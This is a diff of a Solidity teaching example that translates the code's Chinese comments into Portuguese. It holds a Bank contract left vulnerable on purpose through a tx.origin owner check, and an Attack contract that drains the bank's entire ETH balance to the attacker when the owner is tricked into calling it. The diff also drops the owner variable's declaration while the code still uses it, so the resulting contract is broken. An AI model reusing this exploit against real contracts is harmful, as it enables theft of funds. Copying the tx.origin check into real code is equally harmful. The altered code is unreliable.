@@ -1,37 +1,37 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
 contract Bank {
-    address public owner;//记录合约的拥有者
+    //Registrar o proprietário do contrato
 
-    //在创建合约时给 owner 变量赋值
+    //Ao criar o contrato, atribua um valor à variável owner
     constructor() payable {
         owner = msg.sender;
     }
 
     function transfer(address payable _to, uint _amount) public {
-        //检查消息来源
+        //Verificando a origem da mensagem
         require(tx.origin == owner, "Not owner");
-        //转账ETH
+        //Transferir ETH
         (bool sent, ) = _to.call{value: _amount}("");
         require(sent, "Failed to send Ether");
     }
 }
 
 contract Attack {
-    // 受益者地址
+    // Endereço do beneficiário
     address payable public hacker;
-    // Bank合约地址
+    // Endereço do contrato Bank
     Bank bank;
 
     constructor(Bank _bank) {
-        //强制将address类型的_bank转换为Bank类型
+        //Forçar a conversão do tipo _bank de endereço para o tipo Bank
         bank = Bank(_bank);
-        //将受益者地址赋值为部署者地址
+        //Atribuir o endereço do beneficiário como o endereço do deployer
         hacker = payable(msg.sender);
     }
 
     function attack() public {
-        //诱导Bank合约的owner调用，于是Bank合约内的余额就全部转移到黑客地址中
+        //Induz o proprietário do contrato Bank a chamar, assim o saldo dentro do contrato Bank é transferido para o endereço do hacker.
         bank.transfer(hacker, address(bank).balance);
     }
 }
